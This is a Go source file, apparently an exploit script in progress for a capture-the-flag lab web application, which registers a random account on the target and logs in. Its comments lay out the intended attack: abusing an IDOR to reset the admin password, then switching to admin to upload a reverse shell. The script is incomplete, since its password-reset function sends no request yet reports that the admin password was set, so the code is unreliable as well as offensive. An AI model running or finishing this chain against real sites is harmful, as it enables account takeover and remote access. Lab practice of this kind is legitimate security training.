package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"regexp"
	"time"
)

const EnableVirtualTerminalProcessing uint32 = 0x4

var ANSI_SET bool = false

var ANSI_CLRLN string = "\r\x1b[2K\r"
var ANSI_CLRSC string = "\x1b[2J\x1b[H"
var ANSI_RST string = "\x1b[0m"
var ANSI_RED string = "\x1b[31;1m"
var ANSI_GRN string = "\x1b[32;1m"
var ANSI_YLW string = "\x1b[33;1m"
var ANSI_BLU string = "\x1b[34;1m"

type Client struct {
	baseURL string
	Route   string
	Session *http.Client
}

type UserInfo struct {
	Username string
	Password string
}

// ============================================================
//
// Function Name: GetBodyContent
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to take make a GET request to a target
//  route and return the body content to the user.
//
// Input(s):
//
//  route - string. route to make GET request on.
//
// Return(s):
//
//  bodycontent - []byte. content pulled from target URL.
//  success - bool. indication of success.
//  message - string. status message.
//
// ============================================================
func (c *Client) GetBodyContent(route string) (bodycontent []byte, err error) {
	var targetURL string = fmt.Sprintf("%s/%s", c.baseURL, route)

	resp, err := c.Session.Get(targetURL)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	bodycontent, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	return bodycontent, nil
}

// ============================================================
//
// Function Name: Login
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to login to the target site as a
//  specified user. Once login is complete, the cookies will be
//  set to persist the session.
//
// Input(s):
//
//  user - UserInfo. struct containing username and password.
//
// Return(s):
//
//  success - bool. indication of success.
//  message - string. status message.
//
// ============================================================
func (c *Client) Login(user UserInfo) (success bool, message string) {
	const targetroute string = "v2/admin/logincheck.php"
	var targeturl string = fmt.Sprintf("%s/%s", c.baseURL, targetroute)
	var urlparams url.Values = url.Values{}

	urlparams.Set("user", user.Username)
	urlparams.Set("pass", user.Password)
	urlparams.Set("csrf_tokent", "")
	urlparams.Set("submit", "")

	resp, err := c.Session.PostForm(targeturl, urlparams)
	if err != nil {
		return false, err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return false, fmt.Sprintf("bad status code (%s)", resp.Status)
	}

	c.Session.Jar.SetCookies(resp.Request.URL, resp.Cookies())

	return true, "login successful"
}

// ============================================================
//
// Function Name: Logout
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to logout the currently logged in user.
//  This is necessary to perform the attack, because the admin
//  user must be switched to to upload a reverse shell.
//
// Input(s):
//
//  None.
//
// Return(s):
//
//  success - bool. indication of success.
//  message - string. status message.
//
// ============================================================
func (c *Client) Logout() (success bool, message string) {
	const targetroute string = "v2/admin/logout.php"
	var targeturl string = fmt.Sprintf("%s/%s", c.baseURL, targetroute)

	resp, err := c.Session.Get(targeturl)
	if err != nil {
		return false, err.Error()
	}
	defer resp.Body.Close()

	if (resp.StatusCode != 302) && (resp.StatusCode != 200) {
		return false, fmt.Sprintf("bad status code (%s)", resp.Status)
	}

	return true, "logout successful"
}

// ============================================================
//
// Function Name: RegisterUser
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to generate a random username and
//  password combination and register it on the target website.
//
// Input(s):
//
//  None.
//
// Return(s):
//
//  user - UserInfo. struct containing username and password.
//  success - bool. indication of success.
//  message - string. status message.
//
// ============================================================
func (c *Client) RegisterUser() (user UserInfo, success bool, message string) {
	var err error
	var password string
	const phone string = "1111111111"
	var resp *http.Response
	const targetroute string = "v2/admin/reg.php"
	var targeturl string = fmt.Sprintf("%s/%s", c.baseURL, targetroute)
	var urlparams url.Values = url.Values{}
	var username string

	user = UserInfo{}

	username, success, message = GenRandomName()
	if !success {
		return UserInfo{}, false, fmt.Sprintf("error generating username: %s", message)
	}
	username = fmt.Sprintf("%s@test.test", username)

	password, success, message = GenRandomName()
	if !success {
		return UserInfo{}, false, fmt.Sprintf("error generating password: %s", message)
	}

	user.Username = username
	user.Password = password

	urlparams.Set("User_Email", user.Username)
	urlparams.Set("User_Pass", user.Password)
	urlparams.Set("conpass", user.Password)
	urlparams.Set("Us_Cont", phone)
	urlparams.Set("csrf_token", "")
	urlparams.Set("submit", "")

	resp, err = c.Session.PostForm(targeturl, urlparams)
	if err != nil {
		return UserInfo{}, false, err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return UserInfo{}, false, fmt.Sprintf("bad status code (%s)", resp.Status)
	}

	return user, true, "user successfully registered"
}

// ============================================================
//
// Function Name: ResetPassword
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to reset the admin password for the
//  target webpage. This takes advantage of an IDOR.
//
// Input(s):
//
//  None.
//
// Return(s):
//
//  success - bool. indication of success.
//  message - string. status message.
//
// ============================================================
func (c *Client) ResetPassword() (success bool, message string) {
	var newpass string
	const targetuser string = "admin@sky.thm"

	newpass, success, message = GenRandomName()
	if !success {
		return false, message
	}

	return true, fmt.Sprintf("admin password set to %s", newpass)
}

// ============================================================
//
// Function Name: Testconnection
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to test the connection to a target.
//
// Input(s):
//
//  None.
//
// Return(s):
//
//  success - bool. indication of success.
//  message - string. status message.
//
// ============================================================
func (c *Client) TestConnection() (success bool, message string) {
	SysMsgNB(fmt.Sprintf("testing connection to \"%s\"", c.baseURL))

	resp, err := c.Session.Get(c.baseURL)
	if err != nil {
		return false, err.Error()
	}
	defer resp.Body.Close()

	return true, "client connection successful"
}

func SucMsg(msg string) {
	fmt.Printf("%s[%s+%s] %s\n", ANSI_CLRLN, ANSI_GRN, ANSI_RST, msg)
	return
}

func ErrMsg(msg string) {
	fmt.Printf("%s[%s-%s] %s\n", ANSI_CLRLN, ANSI_RED, ANSI_RST, msg)
	return
}

func InfMsg(msg string) {
	fmt.Printf("%s[%si%s] %s\n", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	return
}

func InfMsgNB(msg string) {
	fmt.Printf("%s[%si%s] %s", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	return
}

func SysMsg(msg string) {
	fmt.Printf("%s[%s*%s] %s\n", ANSI_CLRLN, ANSI_YLW, ANSI_RST, msg)
	return
}

func SysMsgNB(msg string) {
	fmt.Printf("%s[%s*%s] %s", ANSI_CLRLN, ANSI_YLW, ANSI_RST, msg)
	return
}

func ValidatePort(portno int) (success bool, message string) {
	if (portno < 1) || (portno > 65535) {
		return false, "port must be between 1 and 65535"
	}
	return true, "port valid"
}

//============================================================
//
// Function Name: PrintCenter
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to print a message in the center of a
//  specified number of columns (n).
//
// Input(s):
//
//  msg - string. message to display.
//  n - int. total number of columns in row.
//
// Return(s):
//
//  None
//
//============================================================
func PrintCenter(msg string, n int) {
	var ansi_indent string = "\x1b%s"
	var indent_format string = "[%dC"
	var indent int

	fmt.Printf("%s", ANSI_CLRLN)
	if len(msg) > n {
		fmt.Printf("%s\n", msg)
		return
	}

	indent = (n - len(msg)) / 2
	indent_format = fmt.Sprintf(indent_format, indent)
	ansi_indent = fmt.Sprintf(ansi_indent, indent_format)

	fmt.Printf("%s%s%s%s\n", ansi_indent, ANSI_YLW, msg, ANSI_RST)

	return
}

func PrintChar(char byte, n int) {
	if n < 1 {
		return
	}

	for i := 0; i < n; i++ {
		fmt.Printf("%s%s%s", ANSI_RED, string(char), ANSI_RST)
	}
	fmt.Printf("\n")
}

//============================================================
//
// Function Name: FindMatch
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to take a byte slice, search the slice
//  for a given regular expression pattern, and return the
//  first match of that pattern.
//
// Input(s):
//
//  bodycontent - []byte. byte slice to search for pattern.
//  tgtpattern - string. regex pattern to search for.
//
// Return(s):
//
//  match - string. first match of pattern discovered.
//  success - bool. indication of success.
//  message - string. status message.
//
//============================================================
func FindMatch(bodycontent []byte, tgtpattern string) (match string, success bool, message string) {

	re, err := regexp.Compile(tgtpattern)
	if err != nil {
		return "", false, err.Error()
	}

	matches := re.FindAll(bodycontent, -1)

	if len(matches) < 1 {
		return "", false, "no match found"
	}

	match = string(matches[0])

	return match, true, "match found"
}

// ============================================================
//
// Function Name: GenRandomName
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to generate a random string 8 characters
//  long, containing only alpha-numeric characters.
//
// Input(s):
//
//  None.
//
// Return(s):
//
//  success - bool. indication of success.
//  message - string. status message.
//
// ============================================================
func GenRandomName() (name string, success bool, message string) {
	const charset string = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	const length int = 8

	name = ""

	for i := 0; i < length; i++ {
		name = fmt.Sprintf("%s%s", name, string(charset[rand.Intn(len(charset))]))
	}

	return name, true, "name successfully generated"
}

func init() {
	return
}

func main() {
	rand.Seed(time.Now().Unix())
	var err error

	var domain string
	var port int

	var baseURL string
	var scheme string

	var secure bool

	var sessioncookies *cookiejar.Jar
	var client Client = Client{Session: &http.Client{Timeout: 10 * time.Second}}

	sessioncookies, err = cookiejar.New(nil)
	if err != nil {
		ErrMsg(err.Error())
		os.Exit(1)
	}
	client.Session.Jar = sessioncookies

	flag.StringVar(&domain, "d", "127.0.0.1", "domain or ip address of target")
	flag.IntVar(&port, "p", 80, "port to communicate with target on")
	flag.BoolVar(&secure, "s", false, "use HTTPS instead of HTTP")
	flag.Parse()

	success, message := ValidatePort(port)
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}

	PrintChar('=', 60)
	PrintCenter("Target Information", 60)
	PrintChar('=', 60)
	InfMsg(fmt.Sprintf("Target Domain: %s", domain))
	InfMsg(fmt.Sprintf("Target Port: %d", port))
	InfMsg(fmt.Sprintf("HTTPS: %v", secure))
	PrintChar('=', 60)

	//============================================================
	// HTTPS check.
	//============================================================
	if secure {
		scheme = "https"
	} else {
		scheme = "http"
	}
	baseURL = fmt.Sprintf("%s://%s:%d", scheme, domain, port)

	client.baseURL = baseURL

	//============================================================
	// Make sure the target is reachable.
	//============================================================
	success, message = client.TestConnection()
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	user, success, message := client.RegisterUser()
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(fmt.Sprintf("%v", user))

	success, message = client.Login(user)
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	return
}

